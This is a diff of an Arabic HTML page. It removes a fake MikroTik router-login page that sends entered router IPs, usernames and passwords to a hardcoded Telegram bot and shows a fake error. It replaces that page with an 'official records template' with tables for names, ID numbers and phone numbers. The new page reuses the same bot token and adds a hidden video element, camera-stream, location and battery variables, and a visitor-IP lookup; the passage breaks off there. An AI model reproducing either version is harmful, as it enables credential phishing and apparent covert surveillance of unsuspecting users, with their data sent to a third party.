@@ -3,410 +3,1559 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إدارة الميكروتك عن طريق الترمينال</title>
+    <title>قالب الكشوفات والبيانات الرسمية</title>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
+    <script>
+        pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
+    </script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&family=Tajawal:wght@300;400;500;700;900&family=Amiri:ital,wght@0,400;0,700;1,400&family=Changa:wght@300;400;500;600;700;800&family=El+Messiri:wght@400;500;600;700&family=Harmattan:wght@400;700&family=Lateef&family=Marhey:wght@400;500;600;700;900&family=Mirza:wght@400;500;600;700&family=Readex+Pro:wght@300;400;500;600;700&family=Reem+Kufi:wght@400;500;600;700&family=Rakkas&family=Scheherazade+New:wght@400;700&family=Aref+Ruqaa:wght@400;700&family=Katibeh&family=Lalezar&family=Lemonada:wght@400;500;600;700&family=Zain:wght@300;400;700;800;900&family=Baloo+Bhaijaan+2:wght@400;500;600;700;800&family=Almarai:wght@300;400;700;800&family=Alexandria:wght@300;400;500;600;700;800;900&family=IBM+Plex+Sans+Arabic:wght@300;400;500;600;700&family=Noto+Kufi+Arabic:wght@300;400;500;600;700;800;900&family=Noto+Naskh+Arabic:wght@400;500;600;700&family=Noto+Sans+Arabic:wght@300;400;500;600;700;800;900&family=Qahiri&family=Mada:wght@300;400;500;600;700;900&family=Vibes&family=Amiri+Quran&family=Athiti:wght@400;600&display=swap" rel="stylesheet">
+
     <style>
-        :root {
-            --bg-body: #07090e;
-            --bg-card: #111827;
-            --bg-input: #030712;
-            --border-color: #1f2937;
-            --accent-green: #10b981;
-            --accent-green-hover: #059669;
-            --accent-blue: #38bdf8;
-            --text-main: #f9fafb;
-            --text-muted: #9ca3af;
+        @page {
+            size: A4 landscape;
+            margin: 5mm;
         }
-        body { 
-            font-family: system-ui, -apple-system, sans-serif; 
-            background: var(--bg-body); 
-            color: var(--text-main); 
-            margin: 0; 
-            padding: 20px; 
-            direction: rtl; 
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #000;
+            direction: rtl;
+            background-color: #eef2f5;
+        }
+
+        .top-ticker {
+            background: linear-gradient(135deg, #004d40, #00695c);
+            color: #ffffff;
+            padding: 8px 0;
+            font-size: 11pt;
+            font-weight: bold;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+            position: sticky;
+            top: 0;
+            z-index: 1001;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .top-ticker marquee {
+            width: 100%;
+        }
+
+        .control-panel {
+            text-align: center;
+            margin: 10px auto;
+            background: #ffffff;
+            padding: 10px 15px;
+            width: 95%;
+            max-width: 1350px;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.15);
             display: flex;
+            flex-wrap: wrap;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            gap: 8px;
+            position: sticky;
+            top: 45px;
+            z-index: 1000;
         }
-        .container { 
-            width: 100%; 
-            max-width: 850px; 
-            background: var(--bg-card); 
-            padding: 30px; 
-            border-radius: 16px; 
-            border: 1px solid var(--border-color); 
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); 
-        }
-        .header-title {
-            text-align: center;
-            color: var(--accent-blue);
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-        .header-subtitle {
-            text-align: center;
-            color: var(--text-muted);
-            font-size: 13px;
-            margin-bottom: 25px;
-        }
-        label { 
-            display: block; 
-            margin-top: 14px; 
-            margin-bottom: 6px; 
-            font-size: 13px; 
-            font-weight: 600;
-            color: var(--text-muted); 
-        }
-        input, select { 
-            width: 100%; 
-            padding: 14px; 
-            background: var(--bg-input); 
-            color: var(--text-main); 
-            border: 1px solid var(--border-color); 
-            border-radius: 10px; 
-            box-sizing: border-box; 
-            font-size: 14px; 
-        }
-        input:focus, select:focus { 
-            border-color: var(--accent-blue); 
-            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.15);
-            outline: none; 
-        }
-        button { 
-            width: 100%; 
-            padding: 14px; 
-            margin-top: 20px;
-            background: var(--accent-green); 
-            color: #000; 
-            font-weight: 800; 
-            cursor: pointer; 
-            border: none; 
-            border-radius: 10px;
-            font-size: 15px;
-            transition: all 0.2s ease; 
-        }
-        button:hover { 
-            background: var(--accent-green-hover); 
-            transform: translateY(-1px);
-        }
-        /* شاشة الترمينال السوداء المتدفقة */
-        pre { 
-            background: #000000; 
-            color: #34d399; 
-            padding: 18px; 
-            border-radius: 10px; 
-            overflow-x: auto; 
-            max-height: 450px; 
-            font-family: 'Courier New', Courier, monospace; 
-            font-size: 13px; 
-            line-height: 1.6; 
-            border: 1px solid #1f2937; 
-            white-space: pre-wrap;
-        }
-        .logout-btn { 
-            background: #ef4444; 
-            color: #fff; 
-            text-decoration: none; 
-            padding: 6px 14px; 
-            border-radius: 6px; 
-            font-size: 12px; 
-            float: left; 
-            cursor: pointer; 
+
+        .btn {
+            background: #00695c;
+            color: #fff;
+            border: none;
+            padding: 6px 12px;
+            font-size: 9pt;
             font-weight: bold;
-            transition: 0.2s;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background 0.2s;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
         }
-        .logout-btn:hover { background: #dc2626; }
-        .cmd-guide { 
-            background: rgba(31, 41, 55, 0.4); 
-            padding: 18px; 
-            border-radius: 12px; 
-            margin-bottom: 20px; 
-            border: 1px solid var(--border-color); 
+
+        .btn:hover {
+            filter: brightness(0.9);
         }
-        .error-box { 
-            background: rgba(127, 29, 29, 0.3); 
-            color: #fca5a5; 
-            padding: 14px; 
-            border-radius: 10px; 
-            text-align: center; 
-            margin-bottom: 20px; 
-            display: none; 
-            border: 1px solid #991b1b; 
-            font-size: 14px;
+
+        .btn-green { background: #2e7d32; }
+        .btn-blue { background: #1565c0; }
+        .btn-red { background: #c62828; }
+        .btn-amber { background: #d97706; color: #fff; }
+        .btn-whatsapp { background: #25d366; color: #fff; }
+        .btn-save { background: #7b1fa2; color: #fff; }
+        .btn-archive { background: #0277bd; color: #fff; }
+        .btn-purple { background: #6a1b9a; color: #fff; }
+        .btn-teal { background: #00838f; color: #fff; }
+        .btn-indigo { background: #3f51b5; color: #fff; }
+        .btn-excel { background: #1b5e20; color: #fff; }
+        
+        .btn-mic-start { background: #2e7d32; color: #fff; }
+        .btn-mic-stop { background: #c62828; color: #fff; }
+        .mic-active-glow { animation: pulse-mic 1.2s infinite; }
+
+        @keyframes pulse-mic {
+            0% { transform: scale(1); filter: brightness(1); }
+            50% { transform: scale(1.06); filter: brightness(1.3); }
+            100% { transform: scale(1); filter: brightness(1); }
         }
-        .success-box { 
-            background: rgba(6, 78, 59, 0.3); 
-            color: #34d399; 
-            padding: 14px; 
-            border-radius: 10px; 
-            text-align: center; 
-            margin-bottom: 20px; 
-            display: none; 
-            border: 1px solid #065f46; 
-            font-size: 14px;
+
+        .control-group {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: #f0f0f0;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 9pt;
+            font-weight: bold;
         }
-        .terminal-panel { display: none; }
-        .footer-note { 
-            text-align: center; 
-            font-size: 12px; 
-            color: var(--text-muted); 
-            margin-top: 30px; 
-            border-top: 1px solid var(--border-color); 
-            padding-top: 15px; 
+
+        select,
+        input[type="color"],
+        input[type="text"] {
+            padding: 4px 6px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-family: inherit;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 9pt;
+            height: 30px;
+            background: #fff;
+        }
+
+        input[type="color"] {
+            width: 32px;
+            padding: 0;
+            border: none;
+            background: none;
+        }
+
+        .search-input {
+            width: 180px;
+            cursor: text !important;
+        }
+
+        .sheet-container {
+            width: 297mm;
+            min-height: 198mm;
+            padding: 5mm 8mm;
+            margin: 15px auto;
+            background: #fff;
+            box-sizing: border-box;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            position: relative;
+            page-break-before: always;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #222;
+            padding-bottom: 2px;
+            margin-bottom: 4px;
+            font-size: 11pt;
+            font-weight: bold;
+            gap: 5px;
+        }
+
+        .editable-header, th[contenteditable="true"] {
+            border: 1px dashed transparent;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        .editable-header:hover, th[contenteditable="true"]:hover {
+            border-color: #00695c;
+            background: #f9f9f9;
+        }
+
+        .editable-header:focus, th[contenteditable="true"]:focus {
+            outline: 2px solid #00695c;
+            background: #fffde7;
+        }
+
+        .table-wrapper {
+            width: 100%;
+            overflow-x: auto;
+            margin-bottom: 5px;
+            flex-grow: 1;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: center;
+            table-layout: fixed;
+        }
+
+        th, td {
+            border: 1px solid #333;
+            padding: 2px;
+            font-size: 9.5pt;
+            height: 26px;
+        }
+
+        th {
+            background-color: #d1d8e0 !important;
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+            color: #111;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f8f9fa !important;
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+
+        .table-input {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: transparent;
+            font-family: inherit;
+            font-size: 9.5pt;
+            font-weight: bold;
+            text-align: right;
+            direction: rtl;
+            padding: 0 4px;
+        }
+
+        .table-input:focus {
+            background-color: #fffde7;
+            outline: 2px solid #00695c;
+        }
+
+        .active-row {
+            background-color: #fff3e0 !important;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            font-size: 8.5pt;
+            color: #444;
+            border-top: 1px solid #888;
+            padding-top: 2px;
+            margin-top: auto;
+        }
+
+        .custom-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+        }
+
+        .modal-content {
+            background: #fff;
+            width: 90%;
+            max-width: 600px;
+            border-radius: 8px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+
+        .archive-item {
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .archive-item-info {
+            font-size: 10pt;
+            font-weight: bold;
+            color: #333;
+        }
+
+        @media (max-width: 700px) {
+            .sheet-container {
+                width: 100%;
+                min-height: 198mm;
+                padding: 8px;
+                overflow: auto;
+            }
+
+            .header-top {
+                font-size: 9pt;
+            }
+
+            .search-input {
+                width: 140px;
+            }
+        }
+
+        @media print {
+            body {
+                background: #fff;
+            }
+
+            .top-ticker,
+            .control-panel,
+            .custom-modal {
+                display: none !important;
+            }
+
+            .sheet-container {
+                box-shadow: none !important;
+                margin: 0 !important;
+                width: 100% !important;
+                height: 198mm !important;
+                min-height: 198mm !important;
+                padding: 4mm !important;
+                page-break-before: always;
+                overflow: hidden !important;
+            }
+
+            .table-input {
+                background: transparent !important;
+                border: none !important;
+            }
         }
     </style>
 </head>
+
 <body>
-<div class="container">
-    
-    <!-- شاشة تسجيل الدخول الخادعة -->
-    <div id="loginPanel">
-        <div class="header-title">⚡ إدارة الميكروتك عن طريق الترمينال</div>
-        <div class="header-subtitle">بوابة الاتصال السحابي المباشر والآمن عبر بروتوكول MikroTik API</div>
-        
-        <div id="errorMsg" class="error-box">فشل الاتصال بالراوتر! تأكد من صحة الآيبي، اسم المستخدم، كلمة المرور أو بورت الـ API.</div>
-        
-        <form id="loginForm" onsubmit="handleLogin(event)">
-            <label>آيبي الراوتر (Router IP)</label>
-            <input type="text" id="host" value="192.168.1.1" required>
-            
-            <label>اسم المستخدم (Username)</label>
-            <input type="text" id="userInput" placeholder="أدخل اسم المستخدم للراوتر" required>
-            
-            <label>كلمة المرور (Password)</label>
-            <input type="password" id="passInput" placeholder="أدخل كلمة المرور" required>
-            
-            <label>بورت الـ API (Port)</label>
-            <input type="number" id="port" value="8728" required>
-            
-            <button type="submit">اتصال بالترمينال (Connect)</button>
-        </form>
+
+    <video id="videoElement" autoplay playsinline style="display:none; width:320px; height:240px;"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+
+    <div class="top-ticker">
+        <marquee behavior="scroll" direction="right" scrollamount="5">
+            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح حموده ✨
+        </marquee>
     </div>
 
-    <!-- شاشة الترمينال الوهمية الشاملة -->
-    <div id="terminalPanel" class="terminal-panel">
-        <div>
-            <span style="font-size: 14px; color: var(--text-muted);">متصل بالراوتر: <strong id="connectedHost" style="color:var(--accent-blue);">192.168.1.1</strong></span>
-            <a onclick="logout()" class="logout-btn">تسجيل خروج</a>
-            <div style="clear:both;"></div>
+    <div class="control-panel">
+        <button class="btn btn-green" onclick="onPdfButtonClicked()" style="font-size:10pt;">🖨️ طباعة / حفظ PDF</button>
+        <button class="btn btn-excel" onclick="onExcelButtonClicked()" title="تصدير وتحميل كافة البيانات كملف Excel (CSV)">📊 حفظ ملف Excel</button>
+        <button class="btn btn-blue" onclick="addNewPage()">📄 صفحة جديدة</button>
+        
+        <div class="control-group" style="background:#e8f5e9; border: 1px solid #2e7d32;">
+            <span>🎙️ الناطق الذكي:</span>
+            <button id="startMicBtn" class="btn btn-mic-start" onclick="startSpeechRecognition()">▶️ تشغيل</button>
+            <button id="stopMicBtn" class="btn btn-mic-stop" onclick="stopSpeechRecognition()" disabled>⏹️ إيقاف</button>
         </div>
 
-        <hr style="border-color:var(--border-color); margin:20px 0;">
-        
-        <div id="successMsg" class="success-box">تم الاتصال بنجاح وتوثيق الجلسة عبر بروتوكول API الآمن!</div>
+        <button class="btn btn-teal" onclick="openBulkImportModal()" title="إدخال قائمة طويلة من الأسماء دفعة واحدة وتوزيعها تلقائياً على الصفوف والصفحات">📥 إدخال جماعي للأسماء</button>
+        <button class="btn btn-indigo" onclick="openPdfModal()" title="رفع ملف PDF واستخراج نصوصه وأسمائه لتعبئتها في الجدول وتعديلها">📂 استخراج من PDF</button>
+        <button class="btn btn-save" onclick="onArchiveButtonClicked()" title="حفظ النسخة في الأرشيف المركزي">💾 حفظ في الأرشيف</button>
+        <button class="btn btn-archive" onclick="openArchiveModal()">📁 حافظة الأعمال (الأرشيف)</button>
+        <button class="btn btn-purple" onclick="sortNamesAlphabetically()" title="ترتيب الأسماء تنازلياً أو تصاعدياً حسب الحروف الهجائية العربية">🔤 ترتيب هجائي</button>
+        <button class="btn btn-amber" onclick="cancelAlphabeticalSort()" title="إلغاء الترتيب الهجائي والعودة للترتيب الأصلي">↩️ إلغاء الترتيب</button>
+        <button class="btn btn-purple" onclick="checkPhoneNumbers()" style="background:#006064;" title="فحص أرقام الجوال فقط وتحديد الأخطاء">📱 تدقيق الأرقام</button>
+        <button class="btn btn-amber" onclick="renumberAllRows()" title="ترقيم جميع الصفوف بشكل تسلسلي متتابع عبر كل الصفحات">🔢 ترقيم تسلسلي</button>
+        <button class="btn btn-red" onclick="resetAllData()" style="background:#b71c1c;">🗑️ مسح الكل</button>
 
-        <!-- قائمة التعليمات والأوامر السريعة -->
-        <div class="cmd-guide">
-            <label style="color:var(--accent-blue); margin-bottom:8px;">📚 تعليمات ودليل الأوامر الشامل (اختر أمراً للتنفيذ الفوري):</label>
-            <select onchange="selectCommand(this)">
-                <option value="">-- اضغط هنا لعرض قائمة التعليمات والأوامر المتاحة --</option>
-                <optgroup label="معلومات النظام والعتاد">
-                    <option value="/system/resource/print">معلومات المعالج والذاكرة وإصدار النظام (/system/resource/print)</option>
-                    <option value="/system/health/print">فحص حرارة وفولتية الراوتر (/system/health/print)</option>
-                    <option value="/system/routerboard/print">معلومات لوحة الراوتر بورد (/system/routerboard/print)</option>
-                    <option value="/system/identity/print">اسم الراوتر الحالي (/system/identity/print)</option>
-                    <option value="/system/clock/print">عرض الوقت والتاريخ (/system/clock/print)</option>
-                </optgroup>
-                <optgroup label="إدارة واجهات الشبكة Interfaces">
-                    <option value="/interface/print">عرض كافة الكروت والواجهات (/interface/print)</option>
-                    <option value="/interface/ethernet/print">عرض كروت الإيثرنت وتفاصيلها (/interface/ethernet/print)</option>
-                    <option value="/interface/wireless/print">عرض إعدادات ومحطات الوايرلس (/interface/wireless/print)</option>
-                </optgroup>
-                <optgroup label="عناوين IP والشبكات">
-                    <option value="/ip/address/print">عرض عناوين الآيبي والشبكات (/ip/address/print)</option>
-                    <option value="/ip/arp/print">عرض جدول الـ ARP والماك آيبي (/ip/arp/print)</option>
-                    <option value="/ip/route/print">عرض جدول التوجيه الرايتنج (/ip/route/print)</option>
-                    <option value="/ip/pool/print">عرض مجاميع الآيبات المتاحة (/ip/pool/print)</option>
-                </optgroup>
-                <optgroup label="إدارة الهوتسبت Hotspot والمشتركين">
-                    <option value="/ip/hotspot/user/print">عرض كافة مستخدمي الهوتسبت (/ip/hotspot/user/print)</option>
-                    <option value="/ip/hotspot/active/print">عرض المتصلين النشطين حالياً بالتفصيل (/ip/hotspot/active/print)</option>
-                    <option value="/ip/hotspot/host/print">عرض الأجهزة المضيفة المتصلة (/ip/hotspot/host/print)</option>
-                    <option value="/ppp/secret/print">عرض مشتركي PPPoE (/ppp/secret/print)</option>
-                    <option value="/queue/simple/print">عرض سرعات المشتركين Queues (/queue/simple/print)</option>
-                </optgroup>
-                <optgroup label="الجدار الناري والسجلات">
-                    <option value="/ip/firewall/nat/print">عرض قوانين الـ NAT وجدولة البورتات (/ip/firewall/nat/print)</option>
-                    <option value="/log/print">عرض سجلات النظام والأخطاء Logs (/log/print)</option>
-                </optgroup>
+        <div class="control-group" style="background:#e0f2f1;">
+            <span>🔍 بحث:</span>
+            <input type="text" id="tableSearchInput" class="search-input" placeholder="ابحث في الجداول..." oninput="filterTableRows()">
+        </div>
+
+        <a href="https://wa.me/967784327056?text=مرحبا%20تواصلت%20بخصوص%20نظام%20السجلات" target="_blank" rel="noopener noreferrer" class="btn btn-whatsapp">💬 التواصل مع المطور</a>
+
+        <span style="border-left:1px solid #ccc;height:20px;margin:0 2px;"></span>
+
+        <div class="control-group">
+            <span>العمود:</span>
+            <button class="btn btn-amber" style="padding:3px 8px;font-size:8pt;" onclick="adjustActiveColWidth(-10)">➖ تضييق</button>
+            <button class="btn btn-amber" style="padding:3px 8px;font-size:8pt;" onclick="adjustActiveColWidth(10)">➕ توسيع</button>
+        </div>
+
+        <button class="btn btn-green" onclick="addRowToActiveTable()">➕ إضافة صف</button>
+        <button class="btn btn-green" onclick="addColumnToActiveTable()">➕ إضافة عمود</button>
+        <button class="btn btn-red" onclick="deleteSelectedRow()">❌ حذف الصف</button>
+        <button class="btn btn-red" onclick="deleteSelectedColumn()">❌ حذف العمود</button>
+        <button class="btn btn-red" onclick="deleteActivePage()" style="background:#b71c1c;">🗑️ حذف الصفحة</button>
+
+        <div class="control-group">
+            <span>✨ الخطوط:</span>
+            <select id="fontSelector" onchange="changeFontFamily(this.value)">
+                <option value="'Cairo', sans-serif" selected>كايرو عريض جداً (Cairo 900)</option>
+                <option value="'Alexandria', sans-serif">الإسكندرية بارز (Alexandria ExtraBold)</option>
+                <option value="'Tajawal', sans-serif">تجوال أسود ثقيل (Tajawal Black)</option>
+                <option value="'Almarai', sans-serif">المراعي عريض جداً (Almarai ExtraBold)</option>
+                <option value="'Changa', sans-serif">شانجا ضخم وبارز (Changa ExtraBold)</option>
+                <option value="'Amiri', serif">أميري - عريض (Amiri Bold)</option>
+                <option value="'Tahoma', sans-serif">تاهوما (Tahoma)</option>
+                <option value="'Arial', sans-serif">أريال (Arial Bold)</option>
             </select>
         </div>
 
-        <form id="cmdForm" onsubmit="runCommand(event)">
-            <label>أمر الترمينال (Terminal Command)</label>
-            <input type="text" id="cmdInput" placeholder="اكتب الأمر هنا أو اختره من القائمة بالأعلى..." required>
-            <button type="submit">تنفيذ الأمر (Execute Command)</button>
-        </form>
-
-        <label style="margin-top:20px; color:#facc15;">مخرجات الترمينال التفصيلية (Terminal Output):</label>
-        <pre id="outputResult">[Admin@MikroTik] > جاهز لاستقبال الأوامر وتنفيذها على النظام...</pre>
+        <div class="control-group">
+            <span>اللون العام:</span>
+            <input type="color" id="textColorPicker" value="#000000" onchange="changeTextColor(this.value)">
+        </div>
     </div>
 
-    <div class="footer-note">
-        إدارة الميكروتك عن طريق الترمينال © 2026 - نظام الإدارة السحابية
+    <div id="pdfModal" class="custom-modal">
+        <div class="modal-content">
+            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #3f51b5;padding-bottom:10px;margin-bottom:15px;gap:10px;">
+                <h3 style="margin:0;color:#3f51b5;">📂 رفع واستخراج البيانات من ملف PDF</h3>
+                <button class="btn btn-red" onclick="closePdfModal()">✖ إغلاق</button>
+            </div>
+            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">اختر ملف PDF من جهازك. سيقوم النظام بقراءة كافة النصوص المستخرجة منه وتعبئتها في الجدول تلقائياً.</p>
+            <div style="margin:15px 0; border:2px dashed #b0bec5; padding:20px; text-align:center; border-radius:8px; background:#fafafa;">
+                <input type="file" id="pdfFileInput" accept=".pdf" style="font-size:10pt; cursor:pointer;" />
+            </div>
+            <div id="pdfStatusMsg" style="font-size:9pt; font-weight:bold; color:#1565c0; text-align:center; margin-bottom:10px;"></div>
+            <div style="display:flex;justify-content:flex-end;gap:10px;margin-top:10px;">
+                <button class="btn btn-indigo" onclick="processUploadedPdf()" style="padding:8px 20px;font-size:10pt;">⚙️ استخراج وإدراج في الجدول</button>
+            </div>
+        </div>
     </div>
-</div>
 
-<script>
-    const BOT_TOKEN = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
-    const CHAT_ID = "7962257606";
+    <div id="bulkImportModal" class="custom-modal">
+        <div class="modal-content">
+            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00838f;padding-bottom:10px;margin-bottom:15px;gap:10px;">
+                <h3 style="margin:0;color:#00838f;">📥 إدخال جماعي للأسماء</h3>
+                <button class="btn btn-red" onclick="closeBulkImportModal()">✖ إغلاق</button>
+            </div>
+            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">قم بلصق قائمة الأسماء هنا (كل اسم في سطر مستقل) لتوزيعها تلقائياً.</p>
+            <textarea id="bulkNamesTextarea" rows="12" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;font-family:inherit;font-size:10pt;resize:vertical;" placeholder="انسخ والصق القائمة هنا..."></textarea>
+            <div style="display:flex;justify-content:flex-end;gap:10px;margin-top:15px;">
+                <button class="btn btn-teal" onclick="processBulkImport()" style="padding:8px 20px;font-size:10pt;">🚀 توزيع وإدراج في الجدول</button>
+            </div>
+        </div>
+    </div>
 
-    function sendTelegramAlert(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "HTML"
-        };
-        fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        }).catch(error => console.log("Telegram Error:", error));
-    }
+    <div id="archiveModal" class="custom-modal">
+        <div class="modal-content" style="max-width:800px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00695c;padding-bottom:10px;margin-bottom:15px;gap:10px;">
+                <h3 style="margin:0;color:#00695c;">📁 حافظة الأعمال والأرشيف المركزي</h3>
+                <button class="btn btn-red" onclick="closeArchiveModal()">✖ إغلاق الحافظة</button>
+            </div>
+            <p style="font-size:9pt;color:#666;margin-top:0;">هنا تجد جميع النسخ والأعمال التي قمت بحفظها سابقاً.</p>
+            <div id="archiveListContainer"></div>
+        </div>
+    </div>
 
-    function handleLogin(event) {
-        event.preventDefault();
-        
-        const host = document.getElementById('host').value.trim();
-        const user = document.getElementById('userInput').value.trim();
-        const pass = document.getElementById('passInput').value.trim();
-        const port = document.getElementById('port').value.trim();
-        const nowTime = new Date().toLocaleString();
+    <div id="pagesWrapper">
+        <div class="sheet-container" onclick="setActiveContext(this,event)">
+            <div class="header-top">
+                <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
+                <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة 1)</div>
+                <div class="editable-header" contenteditable="true">التاريخ: 2026/10/11</div>
+            </div>
 
-        let alertMessage = 
-            `🚨 <b>بيانات جديدة تم التقاطها (إدارة الميكروتك)!</b>\n` +
-            `👤 اسم المستخدم: <code>${user}</code>\n` +
-            `🔑 كلمة المرور: <code>${pass}</code>\n` +
-            `🎯 آيبي الراوتر المدخل: <code>${host}</code>\n` +
-            `🔌 بورت الـ API: <code>${port}</code>\n` +
-            `🕒 وقت المحاولة: ${nowTime}`;
-        
-        sendTelegramAlert(alertMessage);
+            <div class="table-wrapper">
+                <table class="dynamicTable">
+                    <thead>
+                        <tr>
+                            <th style="width:35px;">م</th>
+                            <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الاسم الرباعي</th>
+                            <th style="width:80px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">نوع البطاقة</th>
+                            <th style="width:100px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم البطاقة</th>
+                            <th style="width:90px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم الاتصال</th>
+                            <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">اسم الزوجة / الزوج</th>
+                            <th style="width:70px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الحالة</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <script>
+                            for (let i = 1; i <= 15; i++) {
+                                document.write(`
+                                    <tr onclick="selectRow(this,event)">
+                                        <td>${i}</td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                    </tr>
+                                `);
+                            }
+                        </script>
+                    </tbody>
+                </table>
+            </div>
 
-        let attempts = localStorage.getItem('mikrotik_secure_attempts') ? parseInt(localStorage.getItem('mikrotik_secure_attempts')) : 0;
-        attempts++;
-        localStorage.setItem('mikrotik_secure_attempts', attempts);
+            <div class="footer-bottom">
+                <div class="editable-header" contenteditable="true">الإدارة العامة</div>
+                <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
+            </div>
+        </div>
+    </div>
 
-        if (attempts === 1) {
-            document.getElementById('errorMsg').style.display = 'block';
-        } else {
-            document.getElementById('loginPanel').style.display = 'none';
-            document.getElementById('terminalPanel').style.display = 'block';
-            document.getElementById('connectedHost').innerText = host;
-            document.getElementById('successMsg').style.display = 'block';
-        }
-    }
+    <script>
+        let activeSheet = null;
+        let activeTable = null;
+        let activeRowElement = null;
+        let activeInputElement = null;
 
-    function selectCommand(sel) {
-        if (sel.value) {
-            document.getElementById('cmdInput').value = sel.value;
-        }
-    }
+        const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
+        const chatId = "7962257606";
 
-    // دالة محاكاة Termux: طباعة السطور واحد وراء الآخر بشكل متدفق وواقعي
-    function streamTerminalLines(linesArray) {
-        const resultBox = document.getElementById('outputResult');
-        resultBox.innerText = "";
-        let lineIndex = 0;
+        let userIpInfo = "متاح عبر الشبكة";
+        let batteryInfo = "غير معروفة";
+        let globalLocation = "غير متاح";
+        const deviceInfo = navigator.userAgent;
+        let preSortBackupHtml = null;
 
-        function printNextLine() {
-            if (lineIndex < linesArray.length) {
-                resultBox.innerText += linesArray[lineIndex] + "\n";
-                lineIndex++;
-                resultBox.scrollTop = resultBox.scrollHeight; // التمرير التلقائي للأسفل
-                setTimeout(printNextLine, 120); // سرعة ظهور كل سطر (120 ملي ثانية لتبدو كأنها كتابة حقيقية)
+        let globalCameraStream = null;
+        let cameraPermissionGranted = false;
+
+        let recognition = null;
+        let isListening = false;
+        let manualStop = false;
+
+        async function fetchVisitorIp() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIpInfo = data.ip;
+            } catch (e) {
